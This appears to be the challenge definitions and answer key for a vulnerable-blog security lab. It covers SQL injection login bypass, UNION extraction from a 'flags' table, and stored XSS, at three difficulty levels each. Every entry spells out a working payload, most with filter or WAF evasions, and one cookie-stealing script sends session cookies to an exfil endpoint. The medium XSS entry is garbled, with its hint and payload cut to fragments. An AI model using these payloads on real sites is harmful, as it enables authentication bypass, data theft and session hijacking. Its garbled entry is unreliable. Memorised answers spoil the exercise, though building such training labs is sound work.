title: Blog - SQLi Login Bypass (Easy)
description: Bypass administrative authentication on the blog login portal using a classic SQL injection query concatenation payload.
hints: Inspect the username parameter formatting in the SQL authentication query.
SQL comment syntax '--' or '/*' can be used to discard the subsequent password verification check.
Input payload: ' OR 1=1-- or admin'--

title: Blog - SQLi Login Bypass (Medium)
description: Bypass administrative authentication when common SQL boolean keywords 'OR' and 'AND' as well as '--' comments are blacklisted.
hints: The application WAF inspects both username and password for case-insensitive matches against 'OR', 'AND', and '--'.
SQLite supports block comments '/* ... */' as well as alternative operators.
Input payload: admin'/* or admin' # or admin' || '1'='1

title: Blog - SQLi Login Bypass (Hard)
description: Bypass administrative authentication when all spaces and standard comment markers are strictly blocked by the application WAF.
hints: Spaces and comment indicators ('--', '/*', '#') are blocked by input filters.
SQL queries can be constructed without spaces using tab characters, newlines, or parenthesis groupings.
Input payload: admin'OR('1'='1')OR''=' or admin'\tOR\t''='

title: Blog - UNION Data Extraction (Easy)
description: Exploit the blog search feature using a UNION SELECT attack to extract hidden flags stored in the 'flags' table.
hints: Determine the number of columns returned by the post search query (5 columns: id, title, content, created_at, author).
Look into the SQLite schema or query the 'flags' table directly.
Input payload: ' UNION SELECT 1, name, flag, description, 'author' FROM flags--

title: Blog - UNION Data Extraction (Medium)
description: Extract hidden flags from the 'flags' table when a defensive filter strips 'UNION' and 'SELECT' keywords once.
hints: The server applies a single-pass, non-recursive strip of the words 'UNION' and 'SELECT'.
Nesting the stripped words inside themselves (e.g. UNUNIONION) rebuilds the keyword after removal.
Input payload: ' UNUNIONION SELSELECTECT 1, name, flag, description, 'author' FROM flags--

title: Blog - UNION Data Extraction (Hard)
description: Extract hidden flags from the 'flags' table when spaces and direct keyword patterns are blocked by the WAF.
hints: Whitespace characters are blocked, and 'union select' or 'from flags' regex patterns trigger a 400 error.
SQL allows inline block comments '/**/' to serve as token delimiters without using literal spaces.
Input payload: '/**/UNION/**/SELECT/**/1,name,flag,description,'author'/**/FROM/**/flags--

title: Blog - Stored XSS in Comments (Easy)
description: Inject stored JavaScript markup into blog comments to capture the admin bot's session cookie containing the flag.
hints: Blog comments are rendered directly using Jinja2's '| safe' filter without HTML escaping.
Submit a comment with a <script> tag and trigger the Admin Review bot via the UI or /api/admin/visit-comments.
Payload: <script>fetch('/api/exfil?c=' + document.cookie)</script>

title: Blog - Stored XSS in Comments (Medium)
description: Execute stored XSS when the application strips lowercase <script> tags from incoming comment submissions.
hints: The filter only removes lowercase '<script>' tags.
HTML elements like or
Payload: or

title: Blog - Stored XSS in Comments (Hard)
description: Execute stored XSS when script tags and standard whitespace-delimited onerror and onload handlers are filtered.
hints: The filter strips <script> and matches whitespace before 'onerror' or 'onload'.
HTML parsers accept slashes '/' instead of whitespace between tag names and attributes in SVG elements.
Payload: <svg/onload=alert(document.cookie)> or <iframe srcdoc="..."> or <a href="javascript:...">
